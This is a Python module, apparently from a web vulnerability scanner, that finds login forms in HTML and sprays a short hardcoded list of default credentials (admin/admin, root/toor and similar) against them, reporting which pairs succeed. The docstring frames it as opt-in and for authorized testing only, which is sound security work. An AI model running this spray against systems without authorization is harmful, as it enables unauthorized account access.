"""Opt-in credential spray against discovered login forms — the deferred, end-of-scan
attack the operator turns on explicitly (``--password-spray``).

Deliberately NOT a dictionary attack: a small, bounded list of well-known default
credentials sprayed once each against a detected login form, so it takes seconds, not
hours. Off by default. For authorized testing only — the whole suite already assumes the
operator owns / is authorized to test the target.
"""

from __future__ import annotations

from typing import Dict, List, Tuple
from urllib.parse import urljoin

from bs4 import BeautifulSoup

# A short, bounded set of common defaults — NOT a wordlist.
DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "changeme"),
    ("admin", ""),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("demo", "demo"),
]

_FAILURE_MARKERS = (
    "invalid", "incorrect", "failed", "try again", "not recognized", "wrong password",
    "authentication failed", "bad credentials", "does not match",
)


def find_login_forms(html: str, page_url: str) -> List[Dict]:
    """Every form on the page that carries a password input, described for spraying."""
    forms: List[Dict] = []
    soup = BeautifulSoup(html or "", "html.parser")
    for form in soup.find_all("form"):
        pass_field = None
        user_field = None
        for inp in form.find_all("input"):
            itype = (inp.get("type") or "text").lower()
            name = inp.get("name")
            if not name:
                continue
            if itype == "password" and pass_field is None:
                pass_field = name
            elif itype in ("text", "email", "") and user_field is None:
                user_field = name
        if not pass_field:
            continue
        action = urljoin(page_url, form.get("action") or page_url)
        forms.append({
            "action": action,
            "method": (form.get("method") or "post").upper(),
            "user_field": user_field or "username",
            "pass_field": pass_field,
            "page": page_url,
        })
    return forms


def _login_succeeded(response, username: str, password: str) -> bool:
    """Heuristic success test: a redirect or session cookie, and no failure marker."""
    if response is None:
        return False
    headers = getattr(response, "headers", {}) or {}
    got_cookie = any(k.lower() == "set-cookie" for k in headers)
    redirected = 300 <= getattr(response, "status_code", 0) < 400
    body = (getattr(response, "text", "") or "").lower()
    failed = any(marker in body for marker in _FAILURE_MARKERS)
    if failed:
        return False
    return redirected or got_cookie


def spray_login(request_handler, form: Dict, credentials=None) -> List[Tuple[str, str]]:
    """Try each credential pair once against ``form``; return the pairs that logged in."""
    creds = credentials if credentials is not None else DEFAULT_CREDENTIALS
    valid: List[Tuple[str, str]] = []
    for username, password in creds:
        data = {form["user_field"]: username, form["pass_field"]: password}
        response = request_handler.post(form["action"], data=data, allow_redirects=False)
        if _login_succeeded(response, username, password):
            valid.append((username, password))
    return valid
